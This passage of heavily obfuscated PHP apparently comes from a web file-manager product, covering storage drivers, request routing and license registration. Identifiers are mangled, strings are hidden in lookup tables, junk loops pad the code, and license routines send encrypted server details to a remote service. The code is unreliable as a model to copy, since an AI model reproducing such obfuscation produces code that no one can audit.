$¡æŠ®ê€); $Ş “âİ = fread($Ô±ÜÚ¥Ú, $ÓÈ†î³ç); fclose($Ô±ÜÚ¥Ú); if (!$Ş “âİ) { $this->writeLog(__FUNCTION__ . $êÛååÍø[1445], !0); } return $Ş “âİ; } public function upload($ûŸ˜…Œ¬, $ˆ¨Ÿ„¥™, $Öı‘¾¢´ = false, $¿­§Ñæ¦ = REPEAT_REPLACE) { if ($Öı‘¾¢´) { return $this->moveFile($ˆ¨Ÿ„¥™, $ûŸ˜…Œ¬); } return $this->copyFile($ˆ¨Ÿ„¥™, $ûŸ˜…Œ¬); } public function setModifyTime($²í™‘¦å, $ãû¹†Š­ = '') { @touch($²í™‘¦å, intval($ãû¹†Š­)); } public function download($Ûö”§²÷, $á°õÉæ†) { return $this->iconvSystem($Ûö”§²÷); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¶øºÕÌ) { parent::__construct($¶øºÕÌ); $this->setSignVersion($_SERVER[³Ôà×Ó][247]); } public function fileOutImage($÷è²È£, $Éä¿€©à = 250) { $å²È¬¦ö =& $_SERVER[³Ôà×Ó]; if ($this->size($÷è²È£) > 1024 * 1024 * 25) { return $this->fileOutImageServer($÷è²È£, $Éä¿€©à); } $Š‡¬Ğ ç = array($å²È¬¦ö[1454] => $å²È¬¦ö[1455] . $Éä¿€©à . $å²È¬¦ö[1456]); $°’£—Ñ = $this->link($÷è²È£, $Š‡¬Ğ ç); $this->fileOutLink($°’£—Ñ); } public function fileOutLink($œ©¢„á) { $† éåá =& $_SERVER[³Ôà×Ó]; if (substr($œ©¢„á, 0, 7) == $† éåá[313]) { $œ©¢„á = $† éåá[314] . substr($œ©¢„á, 7); } header($† éåá[175] . $œ©¢„á); die; } } goto a—¬Õ÷ˆÃœ; D½°¨Œ®Ö: $bfgqxhmpwa = $_SERVER[³Ôà×Ó][691]; if (strlen($bfgqxhmpwa) < $_SERVER[³Ôà×Ó][692]) { return; } class Application { private $defaultModule = "\151\156\x64\x65\x78"; private $defaultController = "\151\156\144\145\x78"; private $defaultAction = "\151\156\x64\145\x78"; function __construct() { } public function setDefault($ˆßš§÷¸) { $Ñˆï¶÷Ò =& $_SERVER[³Ôà×Ó]; $ÀÊ±´‹† =& $_SERVER[“¦‹á¼Á]; $±À©¤Àƒ = explode($ÀÊ±´‹†[0], trim($ˆßš§÷¸, $ÀÊ±´‹†[0])); $this->defaultModule = $±À©¤Àƒ[0] ? $±À©¤Àƒ[0] : $this->defaultModule; $Õ›È©ŸŞ = $Ñˆï¶÷Ò[693]; $this->defaultController = $±À©¤Àƒ[1] ? $±À©¤Àƒ[1] : $this->defaultController; $this->defaultAction = $±À©¤Àƒ[2] ? $±À©¤Àƒ[2] : $this->defaultAction; $this->zjdcaf07462a($ÀÊ±´‹†[1], array($this, $ÀÊ±´‹†[2])); $ƒ´’Å—Â = $Ñˆï¶÷Ò[694]; if (strlen($ƒ´’Å—Â) < $Ñˆï¶÷Ò[692]) { return; } } public function appRun($¿ÈöÜÈ‚) { $ıÔĞ³‰´ =& $_SERVER[“¦‹á¼Á]; $¼Ğüöî = explode($ıÔĞ³‰´[0], $¿ÈöÜÈ‚); $¡‡ïÙ = $_SERVER[³Ôà×Ó][695]; $¿¢¢ñÃ¢ = strtolower($¼Ğüöî[0]); $ËÓÔô¶˜ = $ıÔĞ³‰´[3]; if ($¿¢¢ñÃ¢ == $ıÔĞ³‰´[4]) { $ËÓÔô¶˜ = $ıÔĞ³‰´[5]; $¼Ğüöî[0] = $ıÔĞ³‰´[6]; $¼Ğüöî[1] = $¼Ğüöî[1] . $ıÔĞ³‰´[7]; $¿ÈöÜÈ‚ = join($ıÔĞ³‰´[0], $¼Ğüöî); $¿ÈöÜÈ‚ = trim($¿ÈöÜÈ‚, $ıÔĞ³‰´[0]); } call_user_func(array($ıÔĞ³‰´[8], $ıÔĞ³‰´[9]), $ËÓÔô¶˜ . $ıÔĞ³‰´[10], $¿ÈöÜÈ‚); ActionCall($¿ÈöÜÈ‚); call_user_func(array($ıÔĞ³‰´[8], $ıÔĞ³‰´[9]), $ËÓÔô¶˜ . $ıÔĞ³‰´[11], $¿ÈöÜÈ‚); } private function autorun() { $Šê¢ÎÕ” =& $_SERVER[³Ôà×Ó]; $‘’·®£² =& $_SERVER[“¦‹á¼Á]; global $config; if (count($config[$‘’·®£²[12]]) == 0) { return; } foreach ($config[$‘’·®£²[12]] as $Ã±êé´Ë => $õ³§ıŸƒ) { $this->appRun($õ³§ıŸƒ); $²Ôß¡±Ñ = $Šê¢ÎÕ”[696]; if (strlen($²Ôß¡±Ñ) < $Šê¢ÎÕ”[697]) { die; } } } private function pkhrf255dda7() { $©øÌÊó¬ =& $_SERVER[³Ôà×Ó]; $•ıà¤ŸÏ =& $_SERVER[“¦‹á¼Á]; $àÈóÜÍ§ = $•ıà¤ŸÏ[4]; $…–ª‚·ä = $©øÌÊó¬[698]; if (!$…–ª‚·ä) { die; } $ò§œêñ– = $GLOBALS[$•ıà¤ŸÏ[13]][$•ıà¤ŸÏ[14]][0]; $€ã—† = $©øÌÊó¬[699]; if (strlen($€ã—†) < $©øÌÊó¬[697]) { return; } if (!$ò§œêñ– || strlen($ò§œêñ–) <= strlen($àÈóÜÍ§)) { return; } if (strtolower(substr($ò§œêñ–, -strlen($àÈóÜÍ§))) != $àÈóÜÍ§) { return; } $õ€üÅ¾¾ = substr($ò§œêñ–, 0, -strlen($àÈóÜÍ§)); $ê‹¢Õ¹ = $©øÌÊó¬[700]; $µˆÁâ”ü = array($•ıà¤ŸÏ[4], $õ€üÅ¾¾); $¾û¢“è“ = array_slice($GLOBALS[$•ıà¤ŸÏ[13]][$•ıà¤ŸÏ[14]], 1); $°õÙÆ¼» = $©øÌÊó¬[701]; if (strlen($°õÙÆ¼») < $©øÌÊó¬[702]) { return; } $GLOBALS[$•ıà¤ŸÏ[13]][$•ıà¤ŸÏ[14]] = array_merge($µˆÁâ”ü, $¾û¢“è“); $GLOBALS[$•ıà¤ŸÏ[13]][$•ıà¤ŸÏ[15]] = implode($•ıà¤ŸÏ[0], $GLOBALS[$•ıà¤ŸÏ[13]][$•ıà¤ŸÏ[14]]); } private function athjd4237452() { $Âº¿º–ò =& $_SERVER[³Ôà×Ó]; $Ú¥ºàğå =& $_SERVER[“¦‹á¼Á]; if ($GLOBALS[$Ú¥ºàğå[13]][$Ú¥ºàğå[15]] != $Ú¥ºàğå[6]) { return; } $Ûòá‚›ª = $_SERVER[$Ú¥ºàğå[16]]; $Áğ§âÁ¥ = $Ú¥ºàğå[17]; $ÁÙÖŠ¾ = $Âº¿º–ò[703]; if (strlen($ÁÙÖŠ¾) < $Âº¿º–ò[436]) { die; } if (!strstr($Ûòá‚›ª, $Áğ§âÁ¥)) { return; } $“™×¹äÈ = strrpos($Ûòá‚›ª, $Áğ§âÁ¥); $³²ÂÉíŠ = $Âº¿º–ò[704]; while ($³²ÂÉíŠ < $Âº¿º–ò[697]) { if ($³²ÂÉíŠ >= 0) { break; } $³²ÂÉíŠ++; } $„™Ï­«È = substr($Ûòá‚›ª, $“™×¹äÈ + strlen($Áğ§âÁ¥)); preg_match_all($Ú¥ºàğå[18], $„™Ï­«È, $„·íƒë¬); $„™Ï­«È = trim($„·íƒë¬[0][0], $Ú¥ºàğå[19]); $®Ò¸§Î = $Âº¿º–ò[705]; while ($®Ò¸§Î < $Âº¿º–ò[692]) { if ($®Ò¸§Î >= 0) { break; } $®Ò¸§Î++; } $GLOBALS[$Ú¥ºàğå[13]][$Ú¥ºàğå[14]] = explode($Ú¥ºàğå[19], $„™Ï­«È); $GLOBALS[$Ú¥ºàğå[13]][$Ú¥ºàğå[15]] = implode($Ú¥ºàğå[0], $GLOBALS[$Ú¥ºàğå[13]][$Ú¥ºàğå[14]]); $—ÔÀüÒà = $Âº¿º–ò[706]; if (!$—ÔÀüÒà) { return; } } public function run() { $òÈª¸ß =& $_SERVER[³Ôà×Ó]; $Ñ«Ì¼°¹ =& $_SERVER[“¦‹á¼Á]; $this->athjd4237452(); $‘÷÷½› = $òÈª¸ß[707]; while ($‘÷÷½› < $òÈª¸ß[692]) { if ($‘÷÷½› >= 0) { break; } $‘÷÷½›++; } $this->pkhrf255dda7(); $ËçØÌ½¥ = $òÈª¸ß[708]; while ($ËçØÌ½¥ < $òÈª¸ß[709]) { if ($ËçØÌ½¥ >= 0) { break; } $ËçØÌ½¥++; } $©†ª¤’ˆ = $GLOBALS[$Ñ«Ì¼°¹[13]][$Ñ«Ì¼°¹[14]]; $«ô°’ğ = $òÈª¸ß[710]; $˜¯êãè† = $GLOBALS[$Ñ«Ì¼°¹[13]][$Ñ«Ì¼°¹[15]]; define($Ñ«Ì¼°¹[20], isset($©†ª¤’ˆ[0]) && $©†ª¤’ˆ[0] ? $©†ª¤’ˆ[0] : $this->defaultModule); $¶¿íƒé = $òÈª¸ß[711]; while (strlen($¶¿íƒé) < $òÈª¸ß[702]) { if (!$¶¿íƒé) { break; } $¶¿íƒé++; } define($Ñ«Ì¼°¹[21], isset($©†ª¤’ˆ[1]) && $©†ª¤’ˆ[0] ? $©†ª¤’ˆ[1] : $this->defaultController); $½ã”íŸ§ = $òÈª¸ß[712]; if (!$½ã”íŸ§) { die; } define($Ñ«Ì¼°¹[22], isset($©†ª¤’ˆ[2]) && $©†ª¤’ˆ[0] ? $©†ª¤’ˆ[2] : $this->defaultAction); $äœÙÖÁ¿ = $òÈª¸ß[713]; if (!$äœÙÖÁ¿) { die; } define($Ñ«Ì¼°¹[23], MOD . $Ñ«Ì¼°¹[0] . ST . $Ñ«Ì¼°¹[0] . ACT); $¢¬ú—á¼ = $òÈª¸ß[714]; if (!$¢¬ú—á¼) { return; } $_SERVER[$Ñ«Ì¼°¹[24]] = strtolower(ACTION); $™©¶±òÓ = $òÈª¸ß[715]; if (strlen($™©¶±òÓ) < $òÈª¸ß[709]) { die; } $this->autorun(); $„ç«ÑÑ = $òÈª¸ß[716]; while (strlen($„ç«ÑÑ) < $òÈª¸ß[436]) { if (!$„ç«ÑÑ) { break; } $„ç«ÑÑ++; } if (count($©†ª¤’ˆ) >= 3) { $this->appRun($˜¯êãè†); } else { $this->appRun(ACTION); } } private $bcma3d074bc1 = array(); private $kwxufd833411 = ''; public function kvzc82dd1a1b() { $‹ß«Ë–œ =& $_SERVER[³Ôà×Ó]; $°îõæåç =& $_SERVER[“¦‹á¼Á]; $this->rcjk073dae8e(); $ÃÊªŒ¥î = $‹ß«Ë–œ[717]; if (strlen($ÃÊªŒ¥î) < $‹ß«Ë–œ[702]) { die; } $this->ufsc92a46e3c(); $©åÑŸ š = $‹ß«Ë–œ[718]; if (!$©åÑŸ š) { return; } $this->ptlvfc7df044(); $this->ptzd8f1fc737(); $this->nqkr4ba75346(); $this->sywq79383aa6(); $this->dxhkcc644627(); $µÊÖ¡— = $‹ß«Ë–œ[719]; if (!$µÊÖ¡—) { die; } $this->zjdcaf07462a($°îõæåç[25], array($this, $°îõæåç[26])); $this->zjdcaf07462a($°îõæåç[27], array($this, $°îõæåç[28])); $this->zjdcaf07462a($°îõæåç[29], array($this, $°îõæåç[30])); $áç™×‡£ = $‹ß«Ë–œ[720]; while (strlen($áç™×‡£) < $‹ß«Ë–œ[709]) { if (!$áç™×‡£) { break; } $áç™×‡£++; } $this->zjdcaf07462a($°îõæåç[31], array($this, $°îõæåç[32])); $Ã·¾ÒÎ‘ = $‹ß«Ë–œ[721]; while ($Ã·¾ÒÎ‘ < $‹ß«Ë–œ[697]) { if ($Ã·¾ÒÎ‘ >= 0) { break; } $Ã·¾ÒÎ‘++; } } public function gnqb93c8666d($öÑ¤Ö‚®) { $ÏçØ¼¶ =& $_SERVER[³Ôà×Ó]; $ûË¼ß =& $_SERVER[“¦‹á¼Á]; $¢·‚ = Model($ûË¼ß[33])->get(); $â—´Ë = $ÏçØ¼¶[722]; $™µÚºÖ = array($ûË¼ß[34], $ûË¼ß[35], $ûË¼ß[36], $ûË¼ß[37], $ûË¼ß[38], $ûË¼ß[39], $ûË¼ß[40], $ûË¼ß[41], $ûË¼ß[42], $ûË¼ß[43], $ûË¼ß[44], $ûË¼ß[45], $ûË¼ß[46], $ûË¼ß[47], $ûË¼ß[48], $ûË¼ß[49], $ûË¼ß[50], $ûË¼ß[51], $ûË¼ß[52], $ûË¼ß[53], $ûË¼ß[54], $ûË¼ß[55], $ûË¼ß[56], $ûË¼ß[57], $ûË¼ß[58], $ûË¼ß[59], $ûË¼ß[60], $ûË¼ß[61], $ûË¼ß[62], $ûË¼ß[63], $ûË¼ß[64], $ûË¼ß[65], $ûË¼ß[66], $ûË¼ß[67], $ûË¼ß[68], $ûË¼ß[69], $ûË¼ß[70], $ûË¼ß[71], $ûË¼ß[72], $ûË¼ß[73], $ûË¼ß[74], $ûË¼ß[75], $ûË¼ß[76], $ûË¼ß[77], $ûË¼ß[78], $ûË¼ß[79], $ûË¼ß[80], $ûË¼ß[81], $ûË¼ß[82], $ûË¼ß[83], $ûË¼ß[84], $ûË¼ß[85]); $Ôœúî¯ä = $ÏçØ¼¶[723]; while ($Ôœúî¯ä < $ÏçØ¼¶[697]) { if ($Ôœúî¯ä >= 0) { break; } $Ôœúî¯ä++; } foreach ($™µÚºÖ as $òÂÓ£‚) { $Á…Â‹€‘ = $GLOBALS[$ûË¼ß[86]][$ûË¼ß[87]][$òÂÓ£‚]; $ª‡ñ…ĞŠ = $ÏçØ¼¶[724]; if (strlen($ª‡ñ…ĞŠ) < $ÏçØ¼¶[697]) { return; } if (isset($¢·‚[$òÂÓ£‚])) { $Á…Â‹€‘ = $¢·‚[$òÂÓ£‚]; } $öÑ¤Ö‚®[$ûË¼ß[88]][$ûË¼ß[89]][$òÂÓ£‚] = $Á…Â‹€‘; } $àãú¬ö¤ = $öÑ¤Ö‚®[$ûË¼ß[88]][$ûË¼ß[89]][$ûË¼ß[46]]; unset($öÑ¤Ö‚®[$ûË¼ß[88]][$ûË¼ß[90]][$ûË¼ß[91]]); unset($öÑ¤Ö‚®[$ûË¼ß[88]][$ûË¼ß[90]][$ûË¼ß[92]]); unset($öÑ¤Ö‚®[$ûË¼ß[88]][$ûË¼ß[89]][$ûË¼ß[46]]); $Ëçî°Íƒ = $ÏçØ¼¶[725]; unset($öÑ¤Ö‚®[$ûË¼ß[88]][$ûË¼ß[89]][$ûË¼ß[93]]); $öÑ¤Ö‚®[$ûË¼ß[88]][$ûË¼ß[89]][$ûË¼ß[94]] = array($ûË¼ß[95] => (int) $àãú¬ö¤[$ûË¼ß[96]], $ûË¼ß[97] => (int) _get($àãú¬ö¤, $ûË¼ß[98], 0)); $º™ŸÜÂ = substr(md5($ûË¼ß[99] . get_client_ip() . $¢·‚[$ûË¼ß[100]]), 0, 15); $öÑ¤Ö‚®[$ûË¼ß[101]][$ûË¼ß[102]] = Mcrypt::encode(Session::sign(), $º™ŸÜÂ, 3600 * 24); $öÑ¤Ö‚®[$ûË¼ß[101]][$ûË¼ß[103]] = Action($ûË¼ß[104])->accessToken(); $öÑ¤Ö‚®[$ûË¼ß[101]][$ûË¼ß[105]] = md5($_SERVER[$ûË¼ß[106]] . $¢·‚[$ûË¼ß[100]]); $öÑ¤Ö‚®[$ûË¼ß[101]][$ûË¼ß[107]] = base64_encode(serverInfo()); $öÑ¤Ö‚®[$ûË¼ß[101]][$ûË¼ß[108]] = $this->kwxufd833411; $İ²ñµï = $ÏçØ¼¶[726]; if ($¢·‚[$ûË¼ß[108]] != $ûË¼ß[109]) { $öÑ¤Ö‚®[$ûË¼ß[101]][$ûË¼ß[110]] = $¢·‚[$ûË¼ß[110]]; $öÑ¤Ö‚®[$ûË¼ß[101]][$ûË¼ß[111]] = $¢·‚[$ûË¼ß[111]]; $ÖŸşğÄ = rand_string(10) . $this->kwxufd833411 . rand_string(5); $öÑ¤Ö‚®[$ûË¼ß[88]][$ûË¼ß[112]][$ûË¼ß[113]] = $this->gxvk2ce4efbf($ÖŸşğÄ, $öÑ¤Ö‚®[$ûË¼ß[101]][$ûË¼ß[105]]); } if ($this->kwxufd833411 == $ûË¼ß[109]) { $öÑ¤Ö‚®[$ûË¼ß[88]][$ûË¼ß[89]][$ûË¼ß[94]][$ûË¼ß[98]] = 0; } $öÑ¤Ö‚®[$ûË¼ß[101]][$ûË¼ß[114]] = $this->versionPluginFilter(); $öÑ¤Ö‚®[$ûË¼ß[101]][$ûË¼ß[115]] = _get($this->bcma3d074bc1, $ûË¼ß[116], $ûË¼ß[6]); $»Ù¼İÂô = $ÏçØ¼¶[727]; if (KodUser::isRoot() && $this->config[$ûË¼ß[117]]) { $öÑ¤Ö‚®[$ûË¼ß[101]][$ûË¼ß[118]] = WEB_ROOT; } return $öÑ¤Ö‚®; } private function sywq79383aa6() { $‰Èé’„ =& $_SERVER[³Ôà×Ó]; $‰¥†öÑ– =& $_SERVER[“¦‹á¼Á]; $·œËÜŒä = $_SERVER[$‰¥†öÑ–[24]] == $‰¥†öÑ–[119]; if ($_SERVER[$‰¥†öÑ–[24]] == $‰¥†öÑ–[120] && $_GET[$‰¥†öÑ–[121]] == $‰¥†öÑ–[122]) { $·œËÜŒä = !0; } if ($·œËÜŒä) { $Ä…Æ¼ï€ = array($‰¥†öÑ–[108] => $this->kwxufd833411, $‰¥†öÑ–[123] => $this->nkbq6585d8ed(), $‰¥†öÑ–[124] => Model($‰¥†öÑ–[125])->count()); if ($this->kwxufd833411 != $‰¥†öÑ–[109]) { $ğ˜Ê‰« = _get($this->bcma3d074bc1, $‰¥†öÑ–[126]); if ($ğ˜Ê‰«) { $Ä…Æ¼ï€[$‰¥†öÑ–[127]] = $ğ˜Ê‰«; $Ä…Æ¼ï€[$‰¥†öÑ–[128]] = strtotime(_get($this->bcma3d074bc1, $‰¥†öÑ–[129])); $Ä…Æ¼ï€[$‰¥†öÑ–[130]] = _get($this->bcma3d074bc1, $‰¥†öÑ–[116]); } $ò•ğß… = Model($‰¥†öÑ–[33])->get($‰¥†öÑ–[131], $‰¥†öÑ–[6], !0); if (is_string($ò•ğß…) && substr($ò•ğß…, 0, 1) == $‰¥†öÑ–[132]) { $ò•ğß… = json_decode_force($ò•ğß…); } if (is_array($ò•ğß…) && $ò•ğß…[$‰¥†öÑ–[133]] && strstr($ò•ğß…[$‰¥†öÑ–[133]], $‰¥†öÑ–[134])) { $ò´©°­ = explode($‰¥†öÑ–[134], $ò•ğß…[$‰¥†öÑ–[133]]); $Ä…Æ¼ï€[$‰¥†öÑ–[135]] = $ò´©°­[0]; } } $Ä…Æ¼ï€ = $this->stge62bd2512(json_encode($Ä…Æ¼ï€), md5($‰¥†öÑ–[136])); $ÍÓ¤ã‡» = $‰Èé’„[728]; if (!$ÍÓ¤ã‡») { die; } $‹¡ç€Ë¸ = array($‰¥†öÑ–[137] => $Ä…Æ¼ï€); $Ó¨È®²æ = $‰Èé’„[729]; while ($Ó¨È®²æ < $‰Èé’„[702]) { if ($Ó¨È®²æ >= 0) { break; } $Ó¨È®²æ++; } call_user_func(array($‰¥†öÑ–[138], $‰¥†öÑ–[139]), $‹¡ç€Ë¸); } if ($this->kwxufd833411 == $‰¥†öÑ–[109]) { return; } $ĞµÄØ„ = array($‰¥†öÑ–[140], $‰¥†öÑ–[141], $‰¥†öÑ–[142], $‰¥†öÑ–[143], $‰¥†öÑ–[144], $‰¥†öÑ–[145]); $‹§Ì„ì• = Model($‰¥†öÑ–[33])->get(); $‹¡ç€Ë¸ = array($‰¥†öÑ–[146] => $‹§Ì„ì•[$‰¥†öÑ–[34]], $‰¥†öÑ–[147] => $‹§Ì„ì•[$‰¥†öÑ–[35]], $‰¥†öÑ–[148] => $‰¥†öÑ–[6]); foreach ($ĞµÄØ„ as $ƒòë”™) { if (!isset($‹§Ì„ì•[$ƒòë”™]) || !$‹§Ì„ì•[$ƒòë”™]) { continue; } $‹¡ç€Ë¸[$ƒòë”™] = $‹§Ì„ì•[$ƒòë”™]; } call_user_func(array($‰¥†öÑ–[138], $‰¥†öÑ–[139]), $‹¡ç€Ë¸); $ã¸â…¹Å = $‰Èé’„[730]; } private function ptzd8f1fc737() { $°Êö¡ø› =& $_SERVER[³Ôà×Ó]; $­¢ú™ÅÖ =& $_SERVER[“¦‹á¼Á]; if ($_SERVER[$­¢ú™ÅÖ[24]] != $­¢ú™ÅÖ[149]) { return; } if (!KodUser::isRoot()) { die; } $›ï‹êÛ• = $GLOBALS[$­¢ú™ÅÖ[13]]; if (isset($›ï‹êÛ•[$­¢ú™ÅÖ[150]])) { $this->eqlrdb8b2eb5(); die; } if (isset($›ï‹êÛ•[$­¢ú™ÅÖ[151]]) && isset($›ï‹êÛ•[$­¢ú™ÅÖ[151]]) == $­¢ú™ÅÖ[122]) { $›ï‹êÛ•[$­¢ú™ÅÖ[152]] = Model($­¢ú™ÅÖ[33])->get($­¢ú™ÅÖ[153]); } if (!isset($›ï‹êÛ•[$­¢ú™ÅÖ[152]]) || strlen($›ï‹êÛ•[$­¢ú™ÅÖ[152]]) != 16) { show_json($­¢ú™ÅÖ[154] . $›ï‹êÛ•[$­¢ú™ÅÖ[152]], !1); } $¦ØÇ…„¤ = Model($­¢ú™ÅÖ[33])->get($­¢ú™ÅÖ[100]); $êàÕŞİ = md5($_SERVER[$­¢ú™ÅÖ[106]] . $¦ØÇ…„¤); $™¦£œŒ = $°Êö¡ø›[731]; while ($™¦£œŒ < $°Êö¡ø›[692]) { if ($™¦£œŒ >= 0) { break; } $™¦£œŒ++; } $¬šŞš’ = array($­¢ú™ÅÖ[152] => $›ï‹êÛ•[$­¢ú™ÅÖ[152]], $­¢ú™ÅÖ[155] => rand_string(16), $­¢ú™ÅÖ[156] => $­¢ú™ÅÖ[136], $­¢ú™ÅÖ[157] => $­¢ú™ÅÖ[158], $­¢ú™ÅÖ[159] => $_SERVER[$­¢ú™ÅÖ[160]], $­¢ú™ÅÖ[161] => $_SERVER[$­¢ú™ÅÖ[162]], $­¢ú™ÅÖ[163] => $_SERVER[$­¢ú™ÅÖ[164]], $­¢ú™ÅÖ[105] => $êàÕŞİ, $­¢ú™ÅÖ[165] => Model($­¢ú™ÅÖ[33])->get($­¢ú™ÅÖ[131])); if (isset($›ï‹êÛ•[$­¢ú™ÅÖ[151]]) && isset($›ï‹êÛ•[$­¢ú™ÅÖ[151]]) == $­¢ú™ÅÖ[122]) { $¬šŞš’[$­¢ú™ÅÖ[151]] = md5($¬šŞš’[$­¢ú™ÅÖ[152]] . $­¢ú™ÅÖ[166] . $¬šŞš’[$­¢ú™ÅÖ[155]]); } if ($›ï‹êÛ•[$­¢ú™ÅÖ[167]] == $­¢ú™ÅÖ[168]) { $Ÿ˜­ ø = $this->stge62bd2512($êàÕŞİ, $­¢ú™ÅÖ[169]); $À¹…½™ñ = $this->gxvk2ce4efbf(json_encode($¬šŞš’), $êàÕŞİ . $­¢ú™ÅÖ[170], 3); $À¹…½™ñ = $À¹…½™ñ . $­¢ú™ÅÖ[171] . $_SERVER[$­¢ú™ÅÖ[160]]; $ÜâÃ“šş = $this->ltjq208524da($­¢ú™ÅÖ[172] . $Ÿ˜­ ø . $­¢ú™ÅÖ[173] . $À¹…½™ñ, -1); show_json($ÜâÃ“šş, !0); } else { if ($›ï‹êÛ•[$­¢ú™ÅÖ[167]] == $­¢ú™ÅÖ[174]) { $ï¨Ô’Úô = substr(md5($­¢ú™ÅÖ[175] . $êàÕŞİ), 12, 15) . $­¢ú™ÅÖ[176]; $À¹…½™ñ = $this->wanq4235d9f6(trim($›ï‹êÛ•[$­¢ú™ÅÖ[177]]), $ï¨Ô’Úô, 2); $Ú–ÂŠ­” = json_decode($À¹…½™ñ, !0); if (!is_array($Ú–ÂŠ­”) || !is_array($Ú–ÂŠ­”[$­¢ú™ÅÖ[178]]) || $Ú–ÂŠ­”[$­¢ú™ÅÖ[152]] != !0) { $Û§½…ª = $­¢ú™ÅÖ[179]; $´‘º¶Îö = $Ú–ÂŠ­”[$­¢ú™ÅÖ[178]] ? $­¢ú™ÅÖ[180] . $Ú–ÂŠ­”[$­¢ú™ÅÖ[178]] : $Û§½…ª; show_json($´‘º¶Îö, !1); } else { $¬šŞš’[$­¢ú™ÅÖ[155]] = $Ú–ÂŠ­”[$­¢ú™ÅÖ[178]][$­¢ú™ÅÖ[181]]; } } else { $Ú–ÂŠ­” = $this->ltjq208524da($­¢ú™ÅÖ[182], $¬šŞš’, 10); $ÑÂµõ› = $°Êö¡ø›[732]; } } if (!is_array($Ú–ÂŠ­”) || !is_array($Ú–ÂŠ­”[$­¢ú™ÅÖ[178]]) || $Ú–ÂŠ­”[$­¢ú™ÅÖ[152]] != !0) { $Û§½…ª = LNG($­¢ú™ÅÖ[183]); $´‘º¶Îö = $Ú–ÂŠ­”[$­¢ú™ÅÖ[178]] ? $­¢ú™ÅÖ[180] . $Ú–ÂŠ­”[$­¢ú™ÅÖ[178]] : $Û§½…ª; show_json($´‘º¶Îö, !1); } $ƒË’úşİ = $Ú–ÂŠ­”[$­¢ú™ÅÖ[178]]; $ÈµŒª˜× = $this->wupcd8ebaa4b($ƒË’úşİ[$­¢ú™ÅÖ[184]]); $ÃÇ–‰ì = $°Êö¡ø›[733]; if (!$ÈµŒª˜× || $ÈµŒª˜× != $ƒË’úşİ[$­¢ú™ÅÖ[129]]) { $ï„»Òê = array($­¢ú™ÅÖ[185] => Model($­¢ú™ÅÖ[33])->get($­¢ú™ÅÖ[100]), $­¢ú™ÅÖ[186] => $_SERVER[$­¢ú™ÅÖ[106]], $­¢ú™ÅÖ[187] => this_url(), $­¢ú™ÅÖ[161] => $_SERVER[$­¢ú™ÅÖ[162]]); $À¹…½™ñ = $this->kmax2e3d5c14(json_encode($ï„»Òê)); $this->ltjq208524da($­¢ú™ÅÖ[188] . $À¹…½™ñ); show_json(LNG($­¢ú™ÅÖ[189]), !0); } $íïçş¥Å = array($­¢ú™ÅÖ[153] => $ƒË’úşİ[$­¢ú™ÅÖ[190]], $­¢ú™ÅÖ[191] => $ƒË’úşİ[$­¢ú™ÅÖ[192]], $­¢ú™ÅÖ[193] => rand_string(16), $­¢ú™ÅÖ[108] => $ƒË’úşİ[$­¢ú™ÅÖ[194]]); if ($¬šŞš’[$­¢ú™ÅÖ[155]]) { $íïçş¥Å[$­¢ú™ÅÖ[193]] = $¬šŞš’[$­¢ú™ÅÖ[155]]; } $­İÅŠñì = substr(md5($íïçş¥Å[$­¢ú™ÅÖ[191]]), 10, 10); $Ôº×Ê¥™ = $­İÅŠñì . $íïçş¥Å[$­¢ú™ÅÖ[108]] . $íïçş¥Å[$­¢ú™ÅÖ[193]]; $øÛ‘Ë„ = $°Êö¡ø›[734]; if (strlen($øÛ‘Ë„) < $°Êö¡ø›[709]) { return; } $íïçş¥Å[$­¢ú™ÅÖ[110]] = strrev(base64_encode($this->stge62bd2512($Ôº×Ê¥™, $­¢ú™ÅÖ[195]))); $£õ¿”üâ = rand_string(16); $Ö´õ‚·ü = $°Êö¡ø›[735]; if (strlen($Ö´õ‚·ü) < $°Êö¡ø›[709]) { return; } $Şƒ×¤Ø‹ = $£õ¿”üâ . $íïçş¥Å[$­¢ú™ÅÖ[108]] . $this->stge62bd2512(md5($íïçş¥Å[$­¢ú™ÅÖ[153]]), $£õ¿”üâ); $íïçş¥Å[$­¢ú™ÅÖ[111]] = base64_encode(strrev($this->stge62bd2512($Şƒ×¤Ø‹, $­¢ú™ÅÖ[196]))); $âõ´ìµ = $°Êö¡ø›[736]; if ($ƒË’úşİ[$­¢ú™ÅÖ[197]] && $ƒË’úşİ[$­¢ú™ÅÖ[197]] >= 1) { Model($­¢ú™ÅÖ[33])->setDeep($­¢ú™ÅÖ[198], $­¢ú™ÅÖ[122]); } Model($­¢ú™ÅÖ[33])->set($íïçş¥Å); $Ûà²ûÑì = md5($_SERVER[$­¢ú™ÅÖ[106]] . strrev($¦ØÇ…„¤) . $íïçş¥Å[$­¢ú™ÅÖ[191]]); $íšİ‘ºÊ = $°Êö¡ø›[737]; if (!$íšİ‘ºÊ) { return; } $ñÉ–öäó = strrev(substr($Ûà²ûÑì, 10, 16)); $ÃàñÓ‘· = $this->gxvk2ce4efbf(json_encode($ƒË’úşİ), $Ûà²ûÑì); $çù½Ş¥¯ = array_to_keyvalue(Model($­¢ú™ÅÖ[7])->listData(), $­¢ú™ÅÖ[199]); $–Ê¼·ı = $°Êö¡ø›[738]; if (strlen($–Ê¼·ı) < $°Êö¡ø›[702]) { return; } $”¹§ëã• = $çù½Ş¥¯[$­¢ú™ÅÖ[200]]; $Ì§§ÖˆÔ = array(); $ÒÎóĞ½Ç = $°Êö¡ø›[739]; if (strlen($ÒÎóĞ½Ç) < $°Êö¡ø›[436]) { return; } $Ì§§ÖˆÔ[$ñÉ–öäó] = $ÃàñÓ‘·; $±¡½ÊÌû = $°Êö¡ø›[740]; if (strlen($±¡½ÊÌû) < $°Êö¡ø›[692]) { die; } Model($­¢ú™ÅÖ[7])->update($”¹§ëã•[$­¢ú™ÅÖ[201]], array($­¢ú™ÅÖ[202] => $Ì§§ÖˆÔ)); $Äç¦Ø‡ = $°Êö¡ø›[741]; while ($Äç¦Ø‡ < $°Êö¡ø›[692]) { if ($Äç¦Ø‡ >= 0) { break; } $Äç¦Ø‡++; } $this->bcma3d074bc1 = $ƒË’úşİ; $this->kwxufd833411 = $íïçş¥Å[$­¢ú™ÅÖ[108]]; $ÁÕ§¨ËÄ = $°Êö¡ø›[742]; if (!$ÁÕ§¨ËÄ) { die; } $this->licenseRegistSuccess(); Cache::set($­¢ú™ÅÖ[203] . md5($¦ØÇ…„¤ . $­¢ú™ÅÖ[204]), $­¢ú™ÅÖ[6]); show_json(LNG($­¢ú™ÅÖ[189]), !0); } private function licenseRegistSuccess() { 